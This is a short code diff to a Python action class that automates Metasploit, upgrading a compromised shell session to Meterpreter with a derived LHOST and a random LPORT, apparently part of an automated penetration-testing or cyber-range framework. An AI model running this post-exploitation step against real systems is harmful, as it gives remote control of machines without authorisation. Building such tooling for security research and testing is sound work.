@@ -126,20 +126,12 @@ class UpgradeToMeterpreter(MSFAction):
            obs.set_success(False)
            return obs
         session_id = list(target_sessions.keys())[0]
-        print(target_sessions[session_id])
+        #print(target_sessions[session_id])
         # need to identify the LHOST from the session
-        ltunnel = target_sessions[session_id]["tunnel_local"]
-        tunnel_conn = re.match("(.*):(.*)",ltunnel)
-        print(tunnel_conn)
-        tunnel = re.match("(.*)-(.*)",tunnel_conn[1])
-        print(tunnel)
-        if tunnel:
-            lhost = tunnel[1]
-        else:
-            lhost = tunnel_conn[1]
-        print(lhost)
+        lhost = self.get_lhost(target_sessions[session_id]["tunnel_local"])
+        lport = random.randint(4400,4500)
         output = session_handler.execute_module(mtype='post', mname='multi/manage/shell_to_meterpreter',
-                opts={'SESSION': session_id, 'LHOST': lhost, "verbose": "true"})
+            opts={'SESSION': session_id, 'LHOST': lhost, "LPORT": lport, "verbose": "true"})
         obs.add_raw_obs(output)
         obs.set_success(False)
         session = None
